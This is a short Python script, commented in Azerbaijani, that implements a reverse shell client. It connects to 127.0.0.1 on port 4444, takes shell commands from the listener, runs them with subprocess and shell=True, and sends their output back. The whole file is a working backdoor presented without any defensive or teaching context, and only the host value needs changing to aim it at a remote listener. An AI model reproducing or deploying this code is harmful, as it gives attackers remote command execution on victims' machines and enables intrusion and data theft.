import socket
import subprocess

HOST = '127.0.0.1'
PORT = 4444

def run_client():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((HOST, PORT))
    except Exception as e:
        # Bağlantı qurulmazsa bir müddət sonra yenidən cəhd edə bilər
        return

    while True:
        try:
            command = client.recv(1024).decode('utf-8')
            if not command:
                break
            if command.lower() == 'exit':
                break
            
            # Komandanı əməliyyat sistemində icra et
            output = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True
            )
            
            # Nəticəni və ya xətanı hazırla
            result = output.stdout + output.stderr
            if not result:
                result = "[+] Komanda icra olundu (çıxış yoxdur).\n"
                
            client.send(result.encode('utf-8'))
            
        except Exception:
            break

    client.close()

if __name__ == "__main__":
    run_client()